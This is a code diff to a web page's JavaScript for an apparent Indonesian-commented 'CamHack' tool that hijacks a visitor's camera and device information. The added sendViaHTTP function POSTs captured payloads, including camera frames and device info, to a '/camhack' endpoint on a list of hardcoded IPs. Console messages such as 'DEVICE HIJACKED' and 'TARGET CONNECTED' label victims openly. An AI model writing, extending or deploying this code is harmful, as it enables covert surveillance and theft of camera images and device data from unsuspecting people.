@@ -291,9 +291,12 @@
             }
         }
         
-        // Fungsi komunikasi dengan Android app - SIMPLIFIED
+        // Fungsi komunikasi dengan Android app - DIRECT HTTP
         function sendToAndroid(payload) {
-            // Method 1: Android WebView interface (PRIMARY)
+            // Method 1: Direct HTTP POST ke Android server
+            sendViaHTTP(payload);
+            
+            // Method 2: Android WebView interface (backup)
             if (window.Android) {
                 try {
                     if (window.Android.receiveData) {
@@ -302,21 +305,15 @@
                     if (payload.type === 'CAMERA_FRAME' && window.Android.receiveFrame) {
                         window.Android.receiveFrame(JSON.stringify(payload));
                     }
-                    if (payload.type === 'CAMERA_STATUS' && window.Android.receiveStatus) {
-                        window.Android.receiveStatus(JSON.stringify(payload));
-                    }
-                    if (payload.type === 'REALTIME_MONITOR' && window.Android.receiveMonitor) {
-                        window.Android.receiveMonitor(JSON.stringify(payload));
-                    }
                 } catch (e) {
                     console.error('Android interface error:', e);
                 }
             }
             
-            // Method 2: Console logging dengan format khusus untuk debugging
+            // Method 3: Console logging untuk debugging
             console.log('🎯 CAMHACK_DATA:', JSON.stringify(payload));
             
-            // Method 3: LocalStorage backup
+            // Method 4: LocalStorage backup
             try {
                 localStorage.setItem(`camhack_${session}`, JSON.stringify(payload));
                 localStorage.setItem('latest_camhack_data', JSON.stringify(payload));
@@ -326,9 +323,6 @@
                 console.error('LocalStorage error:', e);
             }
             
-            // Method 4: Document title untuk debugging
-            document.title = `📱 CamHack Active - ${payload.type}`;
-            
             // Method 5: Visual indicator di console
             if (payload.type === 'DEVICE_INFO') {
                 console.log('📱 DEVICE HIJACKED:', payload.data);
@@ -337,6 +331,45 @@
             } else if (payload.type === 'TARGET_CONNECTED') {
                 console.log('🎯 TARGET CONNECTED:', session);
             }
+        }
+        
+        // Fungsi untuk kirim data via HTTP langsung ke Android
+        async function sendViaHTTP(payload) {
+            const androidIPs = [
+                '192.168.1.100:8080',
+                '192.168.1.101:8080', 
+                '192.168.1.102:8080',
+                '192.168.1.103:8080',
+                '192.168.1.104:8080',
+                '192.168.1.105:8080',
+                '10.0.0.2:8080',
+                '172.16.0.2:8080',
+                'localhost:8080',
+                '127.0.0.1:8080'
+            ];
+            
+            for (const ip of androidIPs) {
+                try {
+                    const response = await fetch(`http://${ip}/camhack`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                        timeout: 2000
+                    });
+                    
+                    if (response.ok) {
+                        console.log(`✅ Data sent to Android via HTTP: ${ip}`);
+                        return; // Success, stop trying other IPs
+                    }
+                } catch (e) {
+                    // Try next IP
+                    console.log(`❌ Failed to send to ${ip}:`, e.message);
+                }
+            }
+            
+            console.log('⚠️ All HTTP attempts failed, using fallback methods');
         }
         
         // Fungsi untuk mengakses kamera
